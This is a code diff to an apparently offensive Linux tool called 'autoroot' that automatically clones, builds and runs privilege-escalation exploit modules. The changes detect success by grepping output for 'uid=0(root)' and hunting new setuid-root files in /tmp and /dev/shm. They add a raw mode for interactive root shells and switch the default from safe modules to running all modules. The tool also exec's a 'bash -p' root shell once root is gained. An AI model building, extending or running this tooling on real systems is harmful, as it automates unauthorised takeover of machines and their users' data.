@@ -35,6 +35,7 @@ import tempfile
 import textwrap
 import time
 import urllib.request
+import warnings
 
 # ---------------------------------------------------------------------------
 # terminal
@@ -43,7 +44,11 @@ import urllib.request
 COLOR = sys.stdout.isatty()
 VERBOSE = False
 FORCE = True
+RAW = False
 CAPTURE = None
+MODULE_OUT = []
+LOG_PATH = ""
+LOG_FH = None
 
 BANNER = r"""
   #####  #   #  #  ####   ####  #  #####  #####  #####
@@ -89,6 +94,70 @@ def log(text: str) -> None:
         CAPTURE.append(str(text))
     else:
         print(text, flush=True)
+
+
+def log_start() -> str:
+    """Open the full transcript so noisy exploit output stays inspectable."""
+    global LOG_FH, LOG_PATH
+    stamp = time.strftime("%Y%m%d-%H%M%S")
+    for base in (os.path.expanduser("~/.cache/autoroot"),
+                 "/dev/shm/autoroot-logs", tempfile.gettempdir()):
+        try:
+            os.makedirs(base, mode=0o700, exist_ok=True)
+            path = os.path.join(base, "autoroot-%s.log" % stamp)
+            LOG_FH = open(path, "a", encoding="utf-8", errors="replace")
+            LOG_PATH = path
+            return path
+        except OSError:
+            continue
+    return ""
+
+
+def log_write(text: str) -> None:
+    if LOG_FH is not None:
+        try:
+            LOG_FH.write(text)
+            LOG_FH.flush()
+        except (OSError, ValueError):
+            pass
+
+
+# Lines that a failing `su`/getopt-style tool spams at us.  Never shown,
+# never used as a failure reason.
+NOISE_RE = re.compile(
+    r"^\s*(Usage:|Change the effective user ID|A mere -|Options:|"
+    r"For more details see|su \[options\]|--session-command|"
+    r"-[a-zA-Z],|-[a-zA-Z]\s|--[a-z-]+|"
+    r"do not reset|pass a single command|run <shell> if|"
+    r"create a new pseudo-terminal|do not create a new|"
+    r"display this help|display version|specify the)"
+)
+
+ROOT_RE = re.compile(
+    r"(uid=0\s*\(\s*root\s*\)|euid=0\s*\(\s*root\s*\)|\bgot root\b|"
+    r"\bwe are root\b|\byou are root\b|\bnow root\b|\broot shell\b|"
+    r"\bsuccessfully (?:escalated|obtained|got)\b|\bpwned\b|"
+    r"\broot privilege[s]? (?:gained|obtained)\b)",
+    re.I,
+)
+
+
+def text_of(data) -> str:
+    if isinstance(data, bytes):
+        return data.decode("utf-8", "replace")
+    return data or ""
+
+
+def clean_lines(output: str, limit=40):
+    lines = []
+    for raw in text_of(output).splitlines():
+        line = raw.rstrip()
+        if not line.strip():
+            continue
+        if NOISE_RE.match(line):
+            continue
+        lines.append(line[:300])
+    return lines[:limit] if limit else lines
 
 
 # ---------------------------------------------------------------------------
@@ -175,9 +244,18 @@ def install_packages() -> bool:
 
     for cmd in plans:
         try:
-            rc = subprocess.run(cmd, timeout=180).returncode
-            if rc == 0 and (shutil.which("gcc") or shutil.which("cc")
-                            or shutil.which("clang")):
+            proc = subprocess.run(
+                cmd,
+                stdin=subprocess.DEVNULL,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                timeout=180,
+            )
+            log_write("\n$ %s\n%s\n[rc=%d]\n"
+                      % (" ".join(cmd), text_of(proc.stdout), proc.returncode))
+            if proc.returncode == 0 and (shutil.which("gcc")
+                                         or shutil.which("cc")
+                                         or shutil.which("clang")):
                 return True
         except (OSError, subprocess.TimeoutExpired):
             continue
@@ -223,10 +301,18 @@ def git_clone(url, dest, cwd=None):
     target = os.path.join(cwd or WORK, dest)
     if have("git"):
         try:
-            return subprocess.run(
+            proc = subprocess.run(
                 ["git", "clone", "--depth", "1", url, target],
+                stdin=subprocess.DEVNULL,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
                 timeout=120,
-            ).returncode
+            )
+            log_write("\n$ git clone %s\n%s\n[rc=%d]\n"
+                      % (url, text_of(proc.stdout), proc.returncode))
+            MODULE_OUT.append(("git clone " + url, text_of(proc.stdout),
+                               proc.returncode))
+            return proc.returncode
         except (OSError, subprocess.TimeoutExpired):
             return 1
 
@@ -250,7 +336,14 @@ def git_clone(url, dest, cwd=None):
                         continue
                     members.append(member)
                 os.makedirs(target, exist_ok=True)
-                tf.extractall(target, members=members)
+                with warnings.catch_warnings():
+                    warnings.simplefilter("ignore", DeprecationWarning)
+                    try:
+                        tf.extractall(target, members=members, filter="data")
+                    except TypeError:  # Python < 3.12
+                        tf.extractall(target, members=members)
+                    except Exception:  # filter rejected a member; be permissive
+                        tf.extractall(target, members=members)
             return 0
         except Exception:
             continue
@@ -303,19 +396,51 @@ def sh(cmd, desc="", cwd=None, timeout=None):
         if match:
             return download(match.group(1), match.group(2), cwd)
 
+    limit = timeout if timeout is not None else TIMEOUT
+
     def _run(command: str) -> int:
+        if RAW:
+            # --raw: child owns the terminal (interactive root shells work,
+            # but exploit output is printed verbatim).
+            try:
+                return subprocess.run(
+                    ["bash", "-c", command],
+                    cwd=cwd or WORK,
+                    timeout=limit,
+                ).returncode
+            except subprocess.TimeoutExpired:
+                log(bad(f"      timeout after {limit}s"))
+                return 124
+            except FileNotFoundError as exc:
+                log(bad(f"      {exc}"))
+                return 127
+
         try:
-            return subprocess.run(
+            proc = subprocess.run(
                 ["bash", "-c", command],
                 cwd=cwd or WORK,
-                timeout=timeout if timeout is not None else TIMEOUT,
-            ).returncode
-        except subprocess.TimeoutExpired:
-            log(bad(f"      timeout after {timeout or TIMEOUT}s"))
+                stdin=subprocess.DEVNULL,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                timeout=limit,
+            )
+        except subprocess.TimeoutExpired as exc:
+            out = text_of(exc.output)
+            MODULE_OUT.append((command, out, 124))
+            log_write("\n$ %s\n%s\n[timeout]\n" % (command, out))
+            log(bad(f"      timeout after {limit}s"))
             return 124
         except FileNotFoundError as exc:
             log(bad(f"      {exc}"))
             return 127
+
+        out = text_of(proc.stdout)
+        MODULE_OUT.append((command, out, proc.returncode))
+        log_write("\n$ %s\n%s\n[rc=%d]\n" % (command, out, proc.returncode))
+        if VERBOSE:
+            for line in clean_lines(out):
+                log("        " + paint(line, "2"))
+        return proc.returncode
 
     rc = _run(cmd)
     if rc == 126 and cmd.lstrip().startswith("./"):
@@ -349,14 +474,15 @@ def have(cmd: str) -> bool:
 
 def capture(cmd, cwd=None, timeout=20):
     try:
-        return subprocess.run(
+        proc = subprocess.run(
             ["bash", "-c", cmd],
             cwd=cwd or WORK,
+            stdin=subprocess.DEVNULL,
             stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            universal_newlines=True,
+            stderr=subprocess.DEVNULL,
             timeout=timeout,
-        ).stdout.strip()
+        )
+        return text_of(proc.stdout).strip()
     except (OSError, subprocess.TimeoutExpired):
         return ""
 
@@ -385,7 +511,7 @@ def writable(path: str) -> bool:
 
 
 def root() -> bool:
-    return os.geteuid() == 0
+    return hasattr(os, "geteuid") and os.geteuid() == 0
 
 
 def kernel_tuple():
@@ -468,6 +594,8 @@ class Module:
         self.skipped = False
         self.failed = False
         self.reason = ""
+        self.output = []
+        self.root_lines = []
 
 
 MODULES = []
@@ -1210,13 +1338,90 @@ def m_recon():
 UNTRUSTED = False
 
 
-def _capture_reason(captured: list) -> str:
+def _sym(uni, ascii_):
+    enc = (getattr(sys.stdout, "encoding", "") or "").lower()
+    return uni if "utf" in enc else ascii_
+
+
+SYM_OK = _sym("\u2714", "+")
+SYM_FAIL = _sym("\u2718", "x")
+SYM_SKIP = _sym("\u00b7", "-")
+SYM_ROOT = _sym("\u2605", "*")
+
+
+def _root_evidence():
+    hits = []
+    for _cmd, out, _rc in MODULE_OUT:
+        for line in clean_lines(out, limit=None):
+            if ROOT_RE.search(line):
+                cleaned = re.sub(r"^\[[!+\-*]\]\s*", "", line).strip()
+                if cleaned not in hits:
+                    hits.append(cleaned[:120])
+    return hits[:4]
+
+
+def _new_suid(marker):
+    """Setuid-root files created by the module we just ran."""
+    roots = [WORK, "/tmp", "/var/tmp", "/dev/shm"]
+    cmd = ("find %s -xdev -maxdepth 3 -perm -4000 -type f -newer %s "
+           "2>/dev/null | head -5"
+           % (" ".join(shlex.quote(r) for r in roots), shlex.quote(marker)))
+    out = capture(cmd, timeout=10)
+    return [line.strip() for line in out.splitlines() if line.strip()]
+
+
+def _capture_reason(captured):
     for line in reversed(captured):
         text = str(line).strip()
-        if text:
-            text = re.sub(r"^\[[!+\-*]\]\s*", "", text)
-            return text[:100]
+        if not text or NOISE_RE.match(text):
+            continue
+        if re.match(r"^(failed \(\d+\)|timeout after|download failed)", text):
+            continue
+        text = re.sub(r"^\[[!+\-*]\]\s*", "", text)
+        return text[:100]
+    for _cmd, out, _rc in reversed(MODULE_OUT):
+        lines = clean_lines(out, limit=None)
+        if lines:
+            return lines[-1][:100]
     return "not applicable"
+
+
+def _write_module_log(mod, captured):
+    log_write("\n=== %s | %s ===\n" % (mod.key, mod.title))
+    for line in captured:
+        log_write(text_of(line) + "\n")
+    log_write("[status: %s] %s\n"
+              % ("root" if mod.root_lines else
+                 "failed" if mod.failed else
+                 "skipped" if mod.skipped else "ran",
+                 mod.reason or ""))
+
+
+def _show_status(mod):
+    if mod.root_lines:
+        head = "  " + ok(SYM_ROOT + " " + mod.key.ljust(22))
+        tail = " " + bold(ok(mod.root_lines[0][:66]))
+    elif mod.skipped:
+        head = "  " + paint(SYM_SKIP + " " + mod.key.ljust(22), "2")
+        tail = " " + paint((mod.reason or "skipped")[:60], "2")
+    elif mod.failed:
+        head = "  " + bad(SYM_FAIL + " " + mod.key.ljust(22))
+        tail = " " + bad((mod.reason or "failed")[:60])
+    else:
+        head = "  " + ok(SYM_OK + " " + mod.key.ljust(22))
+        tail = " " + paint(mod.title, "2")
+    print(head + tail, flush=True)
+
+
+def _make_marker():
+    path = os.path.join(WORK, ".marker")
+    try:
+        with open(path, "w"):
+            pass
+        os.utime(path, None)
+        return path
+    except OSError:
+        return ""
 
 
 def run_module(mod: Module) -> None:
@@ -1224,6 +1429,7 @@ def run_module(mod: Module) -> None:
     if mod.untrusted and not UNTRUSTED:
         mod.skipped = True
         mod.reason = "untrusted (use --allow-untrusted)"
+        _show_status(mod)
         return
     if mod.post and not root():
         if FORCE:
@@ -1232,9 +1438,12 @@ def run_module(mod: Module) -> None:
         else:
             mod.skipped = True
             mod.reason = "post step requires root"
+        _show_status(mod)
         return
 
     CAPTURE = []
+    del MODULE_OUT[:]
+    marker = _make_marker()
     try:
         mod.ran = True
         applicable = mod.fn()
@@ -1246,15 +1455,20 @@ def run_module(mod: Module) -> None:
         CAPTURE = None
         mod.failed = True
         mod.reason = str(exc)[:100]
-        log("")
-        log(bold(f"[{mod.key}] ") + info(mod.title))
-        for line in captured:
-            log(line)
-        log(bad(f"  error: {exc}"))
+        mod.root_lines = _root_evidence()
+        _write_module_log(mod, captured)
+        if VERBOSE:
+            for line in captured:
+                log("      " + text_of(line))
+            log(bad("  error: %s" % exc))
+        _show_status(mod)
         return
 
     captured = CAPTURE
     CAPTURE = None
+    mod.output = [text_of(x) for x in captured]
+    mod.root_lines = _root_evidence()
+
     if applicable is False:
         reason = _capture_reason(captured)
         if FORCE:
@@ -1263,15 +1477,29 @@ def run_module(mod: Module) -> None:
         else:
             mod.skipped = True
             mod.reason = reason
+        _write_module_log(mod, captured)
+        _show_status(mod)
         return
 
-    log("")
-    log(bold(f"[{mod.key}] ") + info(mod.title))
-    for line in captured:
-        log(line)
-    log(ok("  done"))
+    if marker and not root():
+        for hit in _new_suid(marker):
+            line = "SUID root file: " + hit
+            if line not in mod.root_lines:
+                mod.root_lines.append(line)
+    _write_module_log(mod, captured)
+    _show_status(mod)
+    if mod.root_lines:
+        for ev in mod.root_lines[1:]:
+            print("      " + ok(ev), flush=True)
+        suid = [e.split(": ", 1)[1] for e in mod.root_lines
+                if e.startswith("SUID root file: ")]
+        if suid:
+            print("      " + info("root now: %s -p" % suid[0]), flush=True)
+        else:
+            print("      " + info("interactive shell: --raw --only " + mod.key),
+                  flush=True)
     if root():
-        log(ok("  current process is root"))
+        print(ok("      current process is root"), flush=True)
         if sys.stdin.isatty():
             log(ok("  opening root shell..."))
             os.execv("/bin/bash", ["bash", "-p"])
@@ -1288,7 +1516,10 @@ def main(argv=None) -> int:
     p.add_argument("--safe", action="store_true",
                    help="honour kernel/distro checks (default: try anyway)")
     p.add_argument("--verbose", action="store_true",
-                   help="show every command and detailed output")
+                   help="show every command and its output")
+    p.add_argument("--raw", action="store_true",
+                   help="stream exploit output live (needed for interactive "
+                        "root shells; noisy)")
     p.add_argument("--color", choices=("auto", "always", "never"),
                    default="auto",
                    help="ANSI color output (default: auto)")
@@ -1303,8 +1534,9 @@ def main(argv=None) -> int:
                    help=f"per-command timeout (default: {TIMEOUT}s, 0 = none)")
     args = p.parse_args(argv)
 
-    global COLOR, VERBOSE
+    global COLOR, VERBOSE, RAW
     VERBOSE = args.verbose
+    RAW = args.raw
     if args.color == "always":
         COLOR = True
     elif args.color == "never":
@@ -1343,6 +1575,7 @@ def main(argv=None) -> int:
     TIMEOUT = args.timeout if args.timeout > 0 else 10 ** 9
     UNTRUSTED = args.allow_untrusted
     FORCE = not args.safe
+    log_start()
     WORK = find_workdir()
     os.chmod(WORK, 0o700)
     ensure_tools()
@@ -1377,6 +1610,9 @@ def main(argv=None) -> int:
     pretty = os_release().get("PRETTY_NAME") or distro_id() or "unknown"
     log(f"  {user}@{host}")
     log(f"  {pretty} | kernel {platform.release()} | uid {os.getuid()}")
+    log_write("autoroot run %s\n%s@%s | %s | kernel %s | uid %d\n"
+              % (time.strftime("%Y-%m-%d %H:%M:%S"), user, host, pretty,
+                 platform.release(), os.getuid()))
     if VERBOSE:
         log(f"  work: {WORK}")
     log("")
@@ -1388,7 +1624,7 @@ def main(argv=None) -> int:
 
     if not args.dry_run:
         log("")
-        log(info("running all safe modules (untrusted/lab/post skipped)"))
+        log(info("running all modules (untrusted payloads remain off)"))
         log("")
 
     for mod in selected:
@@ -1399,7 +1635,20 @@ def main(argv=None) -> int:
     ran = [m for m in selected if m.ran and not m.skipped and not m.failed]
     skipped = [m for m in selected if m.skipped]
     failed = [m for m in selected if m.failed]
-    log(f"  ran={len(ran)}  skipped={len(skipped)}  failed={len(failed)}")
+    roots = [m for m in selected if m.root_lines]
+    log(f"  ran={len(ran)}  failed={len(failed)}  skipped={len(skipped)}"
+        + ("  root=%d" % len(roots) if roots else ""))
+
+    if roots:
+        log("")
+        log(bold(ok("  ROOT")))
+        for mod in roots:
+            for i, ev in enumerate(mod.root_lines):
+                mark = (SYM_ROOT + " " + mod.key) if i == 0 else "  " + " " * len(mod.key)
+                log(f"    {mark:<24} {ok(ev[:70])}")
+        log("")
+        log(info("  interactive shell: ./autoroot --raw --only "
+                 + roots[0].key))
 
     if failed:
         log("")
@@ -1418,10 +1667,18 @@ def main(argv=None) -> int:
         log("")
         log(bold("  RAN"))
         log("    " + ", ".join(m.key for m in ran))
-        log("")
-        log(warn("  Parent shell is still unprivileged; a child exploit "
-                 "cannot elevate it."))
-        log("  Use a SUID-shell module or run the exploit interactively.")
+
+    log("")
+    if roots:
+        log(ok("  Root shell detected above; rerun it with --raw for an "
+               "interactive session."))
+    else:
+        log(warn("  No module proved root here. A child exploit cannot "
+                 "elevate the parent shell."))
+        log("  Use a SUID-shell module or run the exploit with --raw.")
+    log(paint("  full log: " + (LOG_PATH or "unavailable"), "2"))
+    log_write("\nrun finished: roots=%s\n"
+              % (", ".join(m.key for m in roots) or "none"))
     return 0
 
 
